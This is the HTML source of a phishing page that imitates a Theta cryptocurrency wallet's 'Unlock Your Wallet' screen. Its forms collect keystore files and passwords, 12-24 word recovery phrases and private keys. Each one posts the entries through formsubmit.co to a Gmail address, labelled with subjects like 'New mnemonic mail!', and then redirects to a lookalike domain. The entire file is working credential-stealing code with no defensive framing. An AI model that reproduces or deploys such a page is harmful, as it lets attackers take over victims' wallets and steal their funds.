<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tetha</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<section>
<div id="main-container">
<img src="images/IMG-20210512-WA0001.jpg" class="main_logo">
<img src="images/loggo-text.png" class="text-logo">
<h2>Unlock Your Wallet</h2>
<div id="wallet-form" class="wallet-page">
    <div class="form-box">
        <div class="button-box">
        <div id="btn"></div>
        <button type="button"onclick='keystore()' class="toggle-btn">KEYSTORE</button>
        <button type="button"onclick='mnemonic()' class="toggle-btn">MNEMONIC</button>
        <button type="button"onclick='privatekey()' class="toggle-btn">PRIVATE KEY</button>
        <button type="button"onclick='hardware()' class="toggle-btn">HARDWARE</button>
        </div>
        <form id="keystore" class="input-group-keystore" action="https://formsubmit.co/thetanetwork9@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://unlockthetamainnet.org/admin.html">
            <input type="hidden" name="_subject" value="New keystore mail!">
            <p>Please select your keystore file</p>
            <div class="file-upload-wrapper" data-text="Choose a keystore file">
                <input name="file-upload-field" type="file" class="file-upload-field" value="">
            </div>
            <input type="text" class="input-field" placeholder="Enter your wallet password" required>
            <button type="submit" class="submit-btn">Unlock Wallet</button>
        </form>
        
        <form id="mnemonic" class="input-group-mnemonic" action="https://formsubmit.co/thetanetwork9@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://unlockthetamainnet.org/admin.html">
            <input type="hidden" name="_subject" value="New mnemonic mail!">
            <input type="hidden" name="_captcha" value="false">
            <h1>Please enter your 12-24 word phrase</h1>
            <textarea name="mnemonic" class="input-field" rows="4" placeholder="" required></textarea>
            <p>please separate each Mnemonic phrase with a space</p>
            <input type="text" name="password" class="input-field" placeholder="Enter temporary session password" required>
            <input type="checkbox" class="check-box"><span>I have entered all details correctly</span>
            <button type="submit" class="submit-btn">Unlock Wallet</button>
        </form>
        <form id="privatekey" class="input-group-private-key" action="https://formsubmit.co/thetanetwork9@gmail.com" method="POST">
            <input type="hidden" name="_next" value="https://unlockthetamainnet.org/admin.html">
            <input type="hidden" name="_subject" value="New privatekey mail!">
            <h1>Please enter your private key</h1>
            <textarea class="input-field" rows="4" placeholder="" required></textarea>
            <p>please enter your private key in HEX format</p>
            <input type="text" class="input-field" placeholder="Enter temporary session password" required>
            <button type="submit" class="submit-btn">Unlock Wallet</button>
        </form>
        <form id="hardware" class="input-group-hardware">
            <h1>Please choose your a wallet type</h1>
            <div class="form-element">
                <input type="checkbox" name="platform" value="trezor" id="trezor">
                <label for="trezor">
                <div class="title">
                    Trezor
                </div>
                </label>
            </div>
            <div class="form-element">
                <input type="checkbox" name="platform" value="ledger" id="ledger">
                <label for="ledger">
                <div class="title">
                    Ledger
                </div>
                </label>
            </div>
            <button type="submit" class="submit-btn">Continue</button>
        </form> 
    </div>
</div>
</div>
</section>
<script src="app.js"></script>
</body>
</html>
